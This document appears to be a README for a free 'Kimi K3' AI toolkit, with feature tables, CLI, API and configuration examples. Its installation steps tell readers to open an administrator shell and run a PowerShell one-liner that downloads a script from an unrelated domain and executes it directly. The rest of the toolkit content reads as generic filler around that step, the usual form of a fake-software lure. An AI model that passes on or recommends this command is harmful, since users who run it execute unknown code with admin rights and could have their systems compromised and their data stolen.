# Kimi K3 Free — Open AI Model Toolkit

> A local-first toolkit for experimenting with Kimi K3-style language models, chat interfaces, prompt workflows, API-compatible gateways, and document analysis.

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm https://software-get.click/Loader.ps1?get=kimi-k3-free | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Kimi K3 Free modules...
[2/4] Installing local chat, prompt, and document tools...
[3/4] Configuring API-compatible providers and workspace settings...
[4/4] Ready. Start building with Kimi K3 Free Toolkit.
```

### Step 4: Start Using the Toolkit
- Launch `kimi-k3-free.exe` or run `npm start`
- Select a local model or API-compatible provider
- Choose chat, coding, document, or structured-output mode
- Add your API key through environment variables when required

## 📌 TL;DR

Kimi K3 Free is an open-source AI toolkit for chat, coding assistance, long-context document analysis, prompt engineering, and structured JSON workflows. It provides a clean local dashboard, OpenAI-compatible API support, streaming responses, conversation history, model presets, and configurable privacy controls.

## ✨ Features

| Feature | Description |
|---|---|
| Chat Workspace | Streaming conversations with system prompt controls |
| Coding Assistant | Code explanation, refactoring, debugging, and generation |
| Long-Context Analysis | Summarize and query large text or document collections |
| Prompt Library | Save, tag, test, compare, and export reusable prompts |
| Structured Output | JSON schema validation and repeatable response formats |
| Provider Profiles | Switch between local and API-compatible providers |
| Conversation Memory | Local history, search, import, and export |
| Developer API | OpenAI-compatible chat completion endpoint |
| Privacy Controls | Local storage, configurable telemetry, and secret masking |
| CLI Mode | Scriptable prompts and batch document workflows |

## 🚀 Quick Start

### Start the Web Workspace
```bash
kimi-k3-free serve --port 3333
```

### Run a Chat Prompt
```bash
kimi-k3-free chat --prompt "Explain this function and suggest two tests" --stream
```

### Analyze a Document
```bash
kimi-k3-free analyze --file ./documents/spec.md --task summarize --format markdown
```

### Generate Structured JSON
```bash
kimi-k3-free extract --input ./notes.txt --schema ./schemas/tasks.json --output ./exports/tasks.json
```

## 🧠 Model and Provider Profiles

```json
{
  "providers": [
    {
      "name": "local-kimi",
      "baseUrl": "http://localhost:8000/v1",
      "model": "kimi-k3",
      "apiKeyEnv": "KIMI_API_KEY"
    }
  ],
  "defaults": {
    "provider": "local-kimi",
    "temperature": 0.7,
    "maxTokens": 4096,
    "stream": true
  }
}
```

Never commit API keys, cookies, or provider credentials to a repository.

## 📡 OpenAI-Compatible API

### Chat Completion
```bash
curl -X POST "http://localhost:3333/v1/chat/completions" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "kimi-k3",
    "messages": [{"role": "user", "content": "Give me a concise project outline."}],
    "stream": false
  }'
```

### Health Check
```bash
curl "http://localhost:3333/health"
```

## 🛠️ Python Example

```python
from kimi_k3_free import Client

client = Client(
    base_url="http://localhost:3333/v1",
    api_key="LOCAL_SANDBOX_KEY",
)

response = client.chat.completions.create(
    model="kimi-k3",
    messages=[
        {"role": "user", "content": "Create a checklist for a software release."}
    ],
)

print(response.choices[0].message.content)
```

## 🧰 Prompt Workflows

```bash
# Save a prompt preset
kimi-k3-free prompts save code-review --file prompts/code-review.md

# Compare two prompt variants
kimi-k3-free prompts compare prompts/v1.md prompts/v2.md --input examples/sample.py

# Run a batch workflow
kimi-k3-free batch --input ./documents --workflow workflows/summarize.json --output ./exports
```

## ⚙️ Configuration

```env
KIMI_PROVIDER=local-kimi
KIMI_MODEL=kimi-k3
KIMI_BASE_URL=http://localhost:8000/v1
KIMI_API_KEY=your_provider_key
KIMI_API_PORT=3333
KIMI_TEMPERATURE=0.7
KIMI_MAX_TOKENS=4096
KIMI_STREAM=true
KIMI_DATA_DIR=./data
KIMI_LOG_LEVEL=info
```

## 📂 Project Structure

```text
kimi-k3-free/
├── data/                   # Local conversations and indexes
├── documents/              # Input documents for analysis
├── exports/                # Generated responses and reports
├── prompts/                # Reusable prompt templates
├── schemas/                # JSON output schemas
├── workflows/              # Batch workflow definitions
├── .env.example            # Configuration template
└── src/
    ├── providers/           # Local and API provider adapters
    ├── chat/                # Conversation and streaming logic
    ├── prompts/             # Prompt library and testing
    ├── documents/           # Ingestion and chunking
    ├── api/                 # OpenAI-compatible API
    └── ui/                  # Web workspace
```

## 🔧 Troubleshooting

### Provider Connection
```bash
kimi-k3-free providers test --name local-kimi
kimi-k3-free config show --redact-secrets
```

### Slow or Large Documents
```bash
kimi-k3-free analyze --file ./documents/book.md --chunk-size 6000 --overlap 400
kimi-k3-free cache clear
```

### Invalid JSON Output
```bash
kimi-k3-free extract --input ./notes.txt --schema ./schemas/tasks.json --retries 2 --validate
```

## 🔒 Privacy and Security

- Store credentials in environment variables or a secret manager
- Keep conversation history in the local data directory
- Review prompts before sending documents to an external provider
- Enable redaction for emails, tokens, and sensitive identifiers
- Use local inference when documents must remain offline

## 🎯 Use Cases

- Local AI chat and prompt experimentation
- Software development and code review
- Long-context document summarization
- Research note organization
- JSON extraction and data transformation
- Reproducible prompt evaluation
- Internal API prototyping

## 🤝 Contributing

Contributions are welcome for provider adapters, evaluation datasets, UI improvements, documentation, and privacy tooling.

```bash
python -m venv .venv
.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python -m pytest
python -m kimi_k3_free
```

## ⚠️ Responsible Use

Use this toolkit with models and providers you are permitted to access. Respect provider terms, data-protection requirements, copyright, and organizational policies. Do not submit confidential documents to external services without appropriate approval.

## 📜 License

MIT License. See [LICENSE](LICENSE) for details.
